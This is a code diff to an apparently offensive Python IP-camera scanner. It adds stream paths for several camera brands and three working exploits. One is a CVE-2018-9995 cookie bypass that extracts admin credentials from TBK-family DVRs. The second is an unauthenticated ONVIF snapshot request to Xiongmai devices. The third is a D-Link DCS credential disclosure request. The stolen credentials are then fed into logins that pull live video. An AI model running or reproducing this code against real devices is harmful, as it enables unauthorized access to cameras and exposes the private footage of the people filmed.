@@ -197,6 +197,23 @@ _BRAND_STREAMS: Dict[str, List[Tuple[str, str]]] = {
         ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
         ("/snapshot.jpg",                                                    "http_snapshot"),
     ],
+    "dlink-dcs": [
+        ("/image/jpeg.cgi",                                                  "http_snapshot"),
+        ("/mjpeg.cgi",                                                       "mjpeg"),
+        ("/video.cgi",                                                       "mjpeg"),
+        ("/cgi/jpg/image.cgi",                                               "http_snapshot"),
+    ],
+    "instar": [
+        ("/tmpfs/auto.jpg",                                                  "http_snapshot"),
+        ("/snapshot.cgi",                                                    "http_snapshot"),
+        ("/videostream.cgi?rate=0",                                          "mjpeg"),
+    ],
+    "geovision": [
+        ("/PictureCatch.cgi",                                                "http_snapshot"),
+        ("/JPGStream",                                                       "mjpeg"),
+        ("/cam0_0.jpg",                                                      "http_snapshot"),
+        ("/MultiStream",                                                     "mjpeg"),
+    ],
 }
 
 # ---------------------------------------------------------------------------
@@ -290,6 +307,105 @@ async def _probe_brand_streams(
 
 
 # ---------------------------------------------------------------------------
+# Special brand probes: bypass / credential discovery / alternate auth
+# ---------------------------------------------------------------------------
+
+async def _probe_dvr_tbk_cookie(
+    ip: str,
+    port: int,
+) -> Optional[Tuple[str, str]]:
+    """CVE-2018-9995: TBK DVR / CeNova / QSee / Night OWL / Securus / Pulnix auth bypass.
+
+    Sends Cookie: uid=admin to /device.rsp?opt=user&cmd=list
+    and extracts the real admin credentials from the JSON response.
+    Returns (user, password) or None.
+    """
+    url = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"
+    headers = {"Cookie": "uid=admin", "User-Agent": "Mozilla/5.0"}
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+            r = await client.get(url, headers=headers)
+            if r.status_code == 200:
+                data = r.json()
+                lst = data.get("list", [])
+                if lst:
+                    user = str(lst[0].get("uid", "admin"))
+                    pwd  = str(lst[0].get("pwd", ""))
+                    return user, pwd
+    except Exception:
+        pass
+    return None
+
+
+async def _probe_xiongmai_onvif_8899(
+    ip: str,
+) -> Optional[str]:
+    """Xiongmai/H264DVR port 8899 unauthenticated ONVIF GetSnapshotUri.
+
+    Sends a minimal ONVIF SOAP request without credentials.
+    Returns snapshot URL string or None.
+    """
+    url = f"http://{ip}:8899/onvif/Media"
+    xml = (
+        '<?xml version="1.0" encoding="utf-8"?>'
+        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
+        ' xmlns:xsd="http://www.w3.org/2001/XMLSchema"'
+        ' xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
+        '<soap:Header><Security xmlns="http://docs.oasis-open.org/wss/2004/01/'
+        'oasis-200401-wss-wssecurity-secext-1.0.xsd">'
+        '<UsernameToken><Username></Username>'
+        '<Password Type="http://docs.oasis-open.org/wss/2004/01/'
+        'oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>'
+        '<Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/'
+        'oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>'
+        '<Created xmlns="http://docs.oasis-open.org/wss/2004/01/'
+        'oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>'
+        '</UsernameToken></Security></soap:Header>'
+        '<soap:Body><GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">'
+        '<ProfileToken>000</ProfileToken>'
+        '</GetSnapshotUri></soap:Body></soap:Envelope>'
+    )
+    headers = {
+        "Content-Type": "application/soap+xml; charset=utf-8",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.5",
+    }
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+            r = await client.post(url, content=xml.encode(), headers=headers)
+            if r.status_code == 200:
+                m = re.search(r"<tt:Uri>(.*?)</tt:Uri>", r.text)
+                if m:
+                    snapshot_url = m.group(1).replace("&amp;", "&")
+                    return snapshot_url
+    except Exception:
+        pass
+    return None
+
+
+async def _probe_dlink_dcs_getuser(
+    ip: str,
+    port: int,
+) -> Optional[Tuple[str, str]]:
+    """D-Link DCS unauth credential disclosure via /config/getuser?index=0.
+
+    Returns (user, password) or None.
+    """
+    url = f"http://{ip}:{port}/config/getuser?index=0"
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
+            r = await client.get(url)
+            if r.status_code == 200 and r.text:
+                user_m = re.search(r"user=(\S+)", r.text)
+                pwd_m  = re.search(r"pass=(\S+)", r.text)
+                if user_m:
+                    return user_m.group(1), (pwd_m.group(1) if pwd_m else "")
+    except Exception:
+        pass
+    return None
+
+
+# ---------------------------------------------------------------------------
 # Public entry point
 # ---------------------------------------------------------------------------
 
@@ -355,18 +471,43 @@ async def probe_ingram(
                 # Set up auth headers / params for snapshot probing
                 working_streams: List[Tuple[str, str]] = []
 
-                # Try with each credential pair
-                for user, pwd in merged_creds[:4]:
-                    async with httpx.AsyncClient(
-                        verify=False,
-                        timeout=_TIMEOUT,
-                        follow_redirects=True,
-                        auth=(user, pwd) if user else None,
-                    ) as auth_client:
-                        streams = await _probe_brand_streams(ip, port, brand_slug, auth_client)
-                        if streams:
-                            working_streams = streams
-                            break
+                # ── Special bypass probes per brand ───────────────────────
+                if brand_slug == "dvr" and not working_streams:
+                    # CVE-2018-9995: TBK DVR cookie auth bypass — extract real creds
+                    creds_extracted = await _probe_dvr_tbk_cookie(ip, port)
+                    if creds_extracted:
+                        extr_user, extr_pwd = creds_extracted
+                        logger.debug("[v2/Ingram] DVR TBK cookie bypass OK %s -> %s:****", ip, extr_user)
+                        merged_creds.insert(0, (extr_user, extr_pwd))
+
+                if brand_slug == "xiongmai" and not working_streams:
+                    # Xiongmai port 8899 unauthenticated ONVIF GetSnapshotUri
+                    snap_url = await _probe_xiongmai_onvif_8899(ip)
+                    if snap_url:
+                        logger.debug("[v2/Ingram] Xiongmai ONVIF 8899 snap: %s", snap_url)
+                        working_streams.append((snap_url, "http_snapshot"))
+
+                if brand_slug == "dlink-dcs" and not working_streams:
+                    # D-Link DCS unauth credential disclosure
+                    creds_extracted = await _probe_dlink_dcs_getuser(ip, port)
+                    if creds_extracted:
+                        extr_user, extr_pwd = creds_extracted
+                        logger.debug("[v2/Ingram] D-Link DCS getuser OK %s -> %s:****", ip, extr_user)
+                        merged_creds.insert(0, (extr_user, extr_pwd))
+
+                # ── Standard credential-based stream probing ──────────────
+                if not working_streams:
+                    for user, pwd in merged_creds[:5]:
+                        async with httpx.AsyncClient(
+                            verify=False,
+                            timeout=_TIMEOUT,
+                            follow_redirects=True,
+                            auth=(user, pwd) if user else None,
+                        ) as auth_client:
+                            streams = await _probe_brand_streams(ip, port, brand_slug, auth_client)
+                            if streams:
+                                working_streams = streams
+                                break
 
                 # Even if no snapshot found, mark brand detected
                 result["success"] = True
